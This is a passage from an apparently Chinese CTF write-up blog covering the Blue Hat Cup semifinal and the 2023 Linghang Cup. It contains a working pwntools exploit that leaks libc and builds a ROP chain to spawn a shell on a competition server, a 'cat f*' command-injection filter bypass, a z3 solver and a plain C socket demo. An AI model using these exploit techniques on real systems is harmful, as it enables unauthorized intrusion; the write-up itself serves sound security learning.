class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><h3 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h4><p>常规的堆题，存在好多漏洞（uaf、栈溢出），发现edit功能用不了，所以选择栈溢出了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./main&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc-2.31.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;120.78.172.238&#x27;</span>, <span class="number">42027</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;content size: \n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;book content: \n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;book index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;book index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;book content: \n&#x27;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">leak_addr = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x208</span> + p64(<span class="number">8</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(libc_base + <span class="number">0x0000000000025679</span>)</span><br><span class="line">pld += p64(libc_base + <span class="number">0x0000000000026b72</span>)</span><br><span class="line">pld += p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__())</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x15a5)&#x27;)</span></span><br><span class="line">add(<span class="number">0x500</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h4><p>非预期，直接可以执行命令，过滤不完全，直接<code>cat f*</code>就行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1C86</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Command: &quot;</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3 - <span class="number">2</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf[i], <span class="string">&quot;sh&quot;</span>, <span class="number">2uLL</span>) )</span><br><span class="line">        err(<span class="string">&quot;Permission Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v3 - <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf[j], <span class="string">&quot;flag&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">        err(<span class="string">&quot;Permission Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4010 )</span><br><span class="line">LABEL_14:</span><br><span class="line">    system(buf);						<span class="comment">// system(&#x27;cat f*&#x27;);</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="justamat"><a href="#justamat" class="headerlink" title="justamat"></a>justamat</h4><p>调试下来，首先会对我们的输入做一个字符串的拼接，拼接后的字符串如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">there_are_a_lot_useless_information_but_oh.o0O_&lt;your ipt&gt;_you_get_it</span><br><span class="line">there_are_a_lot_useless_information_but_oh.o0O_111111111111111111111111111111111111111111_you_get_it</span><br></pre></td></tr></table></figure>

<p>然后会对整个字符串的长度做一个检查是否为100，之后进入处理字符串的核心函数sub_4051A0。sub_4051A0函数先做一个密文的初始化和赋值，然后每次对拼接的字符串的10个字符进行检测，一共进行10次检测。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">enctext1 = [<span class="number">0x000000FE</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F6</span>, <span class="number">0x00000083</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000E0</span>, <span class="number">0x000000B8</span>, </span><br><span class="line">            <span class="number">0x000000DD</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000F6</span>, <span class="number">0x00000014</span>, <span class="number">0x0000009F</span>, <span class="number">0x000000DD</span>, </span><br><span class="line">            <span class="number">0x000000D9</span>, <span class="number">0x00000007</span>, <span class="number">0x0000002D</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000019</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000073</span>, <span class="number">0x000000FD</span>, </span><br><span class="line">            <span class="number">0x00000087</span>, <span class="number">0x00000072</span>, <span class="number">0x00000024</span>, <span class="number">0x00000004</span>, <span class="number">0x00000049</span>, <span class="number">0x0000007E</span>, <span class="number">0x000000A9</span>, <span class="number">0x000000CE</span>, </span><br><span class="line">            <span class="number">0x00000091</span>, <span class="number">0x000000BE</span>, <span class="number">0x00000041</span>, <span class="number">0x00000018</span>, <span class="number">0x00000060</span>, <span class="number">0x0000003F</span>, <span class="number">0x0000002B</span>, <span class="number">0x00000063</span>, </span><br><span class="line">            <span class="number">0x0000001C</span>, <span class="number">0x000000D2</span>, <span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x0000008E</span>, <span class="number">0x000000BA</span>, <span class="number">0x0000001E</span>, <span class="number">0x000000F3</span>, </span><br><span class="line">            <span class="number">0x00000041</span>, <span class="number">0x000000AD</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000003</span>, <span class="number">0x00000069</span>, <span class="number">0x000000DA</span>, <span class="number">0x00000010</span>, <span class="number">0x000000FD</span>, </span><br><span class="line">            <span class="number">0x000000FD</span>, <span class="number">0x000000E7</span>, <span class="number">0x00000006</span>, <span class="number">0x00000036</span>, <span class="number">0x000000D6</span>, <span class="number">0x00000002</span>, <span class="number">0x00000059</span>, <span class="number">0x00000018</span>, </span><br><span class="line">            <span class="number">0x000000CC</span>, <span class="number">0x00000050</span>, <span class="number">0x00000087</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000FB</span>, <span class="number">0x00000018</span>, <span class="number">0x00000044</span>, <span class="number">0x0000007F</span>, </span><br><span class="line">            <span class="number">0x000000AD</span>, <span class="number">0x000000F8</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000067</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000022</span>, <span class="number">0x00000084</span>, <span class="number">0x000000AC</span>, </span><br><span class="line">            <span class="number">0x0000000E</span>, <span class="number">0x00000023</span>, <span class="number">0x000000DC</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000BB</span>, <span class="number">0x000000D2</span>, <span class="number">0x000000B8</span>, <span class="number">0x0000004A</span>, </span><br><span class="line">            <span class="number">0x000000BC</span>, <span class="number">0x000000DE</span>, <span class="number">0x00000050</span>, <span class="number">0x0000009C</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000086</span>, <span class="number">0x0000003A</span>, </span><br><span class="line">            <span class="number">0x0000002D</span>, <span class="number">0x000000DD</span>, <span class="number">0x000000C3</span>, <span class="number">0x00000003</span>]</span><br><span class="line"></span><br><span class="line">enctext2 = [<span class="number">0x0001C633</span>, <span class="number">0x0001DF94</span>, <span class="number">0x00020EBF</span>, <span class="number">0x0002BA40</span>, <span class="number">0x0001E884</span>, <span class="number">0x000260D1</span>, <span class="number">0x0001F9B1</span>, <span class="number">0x0001EA1A</span>, </span><br><span class="line">            <span class="number">0x0001EEAA</span>, <span class="number">0x0001DFB2</span>, <span class="number">0x0001C1D0</span>, <span class="number">0x0001EEF2</span>, <span class="number">0x000216E1</span>, <span class="number">0x0002BE00</span>, <span class="number">0x0001FB5E</span>, <span class="number">0x00025D74</span>, </span><br><span class="line">            <span class="number">0x0001F000</span>, <span class="number">0x000202D6</span>, <span class="number">0x00020002</span>, <span class="number">0x0001DDFE</span>, <span class="number">0x0001C017</span>, <span class="number">0x0001F08C</span>, <span class="number">0x000227F6</span>, <span class="number">0x0002C7BA</span>, </span><br><span class="line">            <span class="number">0x000201AE</span>, <span class="number">0x00027FBF</span>, <span class="number">0x00020E21</span>, <span class="number">0x0001FF5C</span>, <span class="number">0x0001FD62</span>, <span class="number">0x0001E948</span>, <span class="number">0x0001BE6E</span>, <span class="number">0x0001F4D7</span>, </span><br><span class="line">            <span class="number">0x00022C8D</span>, <span class="number">0x0002C353</span>, <span class="number">0x0001F8DB</span>, <span class="number">0x00026E1D</span>, <span class="number">0x0001FF61</span>, <span class="number">0x0001EA0F</span>, <span class="number">0x0001F0D6</span>, <span class="number">0x0001EDA8</span>, </span><br><span class="line">            <span class="number">0x0001AD7D</span>, <span class="number">0x00018218</span>, <span class="number">0x0001CCD4</span>, <span class="number">0x000239B6</span>, <span class="number">0x0001AC4C</span>, <span class="number">0x00020D7C</span>, <span class="number">0x0001D967</span>, <span class="number">0x0001A4F4</span>, </span><br><span class="line">            <span class="number">0x0001CAD8</span>, <span class="number">0x000196AE</span>, <span class="number">0x0001831B</span>, <span class="number">0x00017E45</span>, <span class="number">0x0001D0CF</span>, <span class="number">0x00023EDF</span>, <span class="number">0x000181AE</span>, <span class="number">0x00021760</span>, </span><br><span class="line">            <span class="number">0x0001D3B4</span>, <span class="number">0x000175D6</span>, <span class="number">0x00017D3A</span>, <span class="number">0x0001994F</span>, <span class="number">0x0001189D</span>, <span class="number">0x00014CCF</span>, <span class="number">0x0001568E</span>, <span class="number">0x00017EEB</span>, </span><br><span class="line">            <span class="number">0x0001327E</span>, <span class="number">0x00016A45</span>, <span class="number">0x00012921</span>, <span class="number">0x00011FF0</span>, <span class="number">0x00013643</span>, <span class="number">0x00011729</span>, <span class="number">0x00015191</span>, <span class="number">0x00017D17</span>, </span><br><span class="line">            <span class="number">0x00017262</span>, <span class="number">0x0001A863</span>, <span class="number">0x00017010</span>, <span class="number">0x00017B10</span>, <span class="number">0x00014F9C</span>, <span class="number">0x000143E8</span>, <span class="number">0x00015E9B</span>, <span class="number">0x0001242C</span>, </span><br><span class="line">            <span class="number">0x0000F68C</span>, <span class="number">0x0001192A</span>, <span class="number">0x000150AD</span>, <span class="number">0x0001B1A0</span>, <span class="number">0x00014C60</span>, <span class="number">0x000182AB</span>, <span class="number">0x00013F4B</span>, <span class="number">0x000141A6</span>, </span><br><span class="line">            <span class="number">0x00015AA3</span>, <span class="number">0x000135C9</span>, <span class="number">0x0001D86F</span>, <span class="number">0x0001E8FA</span>, <span class="number">0x0002158D</span>, <span class="number">0x0002BDAC</span>, <span class="number">0x00020E4F</span>, <span class="number">0x00027EE6</span>, </span><br><span class="line">            <span class="number">0x000213B9</span>, <span class="number">0x00020E86</span>, <span class="number">0x000211FF</span>, <span class="number">0x0001E1EF</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># there_are_a_lot_useless_information_but_oh.o0O_111111111111111111111111111111111111111111_you_get_it</span></span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    plain.append(z3.Int(<span class="string">&#x27;x%d&#x27;</span> % i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="built_in">sum</span> += enctext1[j + y*<span class="number">10</span>] * plain[y + i*<span class="number">10</span>]</span><br><span class="line">        s.add(<span class="built_in">sum</span> == enctext2[j + i*<span class="number">10</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">rs = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(rs[i].as_long()), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>















]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>蓝帽杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 领航杯</title>
    <url>/2023/09/05/CTF/2023%E9%A2%86%E8%88%AA%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="secretnote"><a href="#secretnote" class="headerlink" title="secretnote"></a>secretnote</h3><p>还是有点难度的一道题，比赛时候拿了二血。</p>
<p>乘着这个机会，学习一下C语言的socket编程吧。写了一个最简单的demo，包含服务端和客户端，实现了接收数据和发送数据的功能。</p>
<p>服务端（<code>socket() -&gt; bind() -&gt; listen() -&gt; accept()</code>）：</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFFER_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKLOG 1                   <span class="comment">// 最大监听数</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建 socket</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (serverSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置服务器地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">    serverAddress.sin_family = AF_INET;             <span class="comment">// 表示接收本机或其他机器传输</span></span><br><span class="line">    serverAddress.sin_addr.s_addr = htonl(INADDR_ANY);     <span class="comment">// 表示本机IP</span></span><br><span class="line">    serverAddress.sin_port = htons(PORT);           <span class="comment">// 端口号</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定服务器地址和端口</span></span><br><span class="line">    <span class="keyword">if</span> (bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听连接</span></span><br><span class="line">    <span class="keyword">if</span> (listen(serverSocket, BACKLOG) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to listen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server started and listening on port %d\n&quot;</span>, PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 接受客户端连接</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span>       <span class="comment">// 客户端地址信息</span></span><br><span class="line">        <span class="type">int</span> clientSocket;</span><br><span class="line">        <span class="type">int</span> clientAddressLength = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">        clientSocket = accept(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;clientAddress, (<span class="type">socklen_t</span>*)&amp;clientAddressLength);</span><br><span class="line">        <span class="keyword">if</span> (clientSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Failed to accept&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;New fd: %d\n&quot;</span>, clientSocket);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接收客户端数据</span></span><br><span class="line">        <span class="type">char</span> buffer[MAX_BUFFER_SIZE];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        <span class="keyword">if</span> (recv(clientSocket, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Failed to receive data from client&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received data from client: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送数据给客户端</span></span><br><span class="line">        <span class="keyword">if</span> (send(clientSocket, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Failed to send data to client&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data sent to client: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭客户端连接</span></span><br><span class="line">        close(clientSocket);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Client disconnected\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭服务器连接</span></span><br><span class="line">    close(serverSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端（<code>socket() -&gt; connect()</code>）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RPORT 6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RHOST <span class="string">&quot;0.0.0.0&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[MAX_BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">remoteAddress</span>;</span></span><br><span class="line">    remoteAddress.sin_family = AF_INET;</span><br><span class="line">    remoteAddress.sin_addr.s_addr = inet_addr(RHOST);</span><br><span class="line">    remoteAddress.sin_port = htons(RPORT);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;remoteAddress, <span class="keyword">sizeof</span>(remoteAddress)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Connect successfully\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">4096</span>);</span><br><span class="line">    <span class="keyword">if</span> (send(clientSocket, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to send&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">if</span> (recv(clientSocket, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to recv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Receive from server: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(clientSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Server started and listening on port 6666</span><br><span class="line">New fd: 4</span><br><span class="line">Received data from client: pursue</span><br><span class="line"></span><br><span class="line">Data sent to client: pursue</span><br><span class="line"></span><br><span class="line">Client disconnected</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Connect successfully</span><br><span class="line">pursue</span><br><span class="line">Receive from server: pursue</span><br></pre></td></tr></table></figure>

<p>关于漏洞点的发掘，在数据处理中对于长度的检查出现了纰漏，导致了栈溢出。</p>
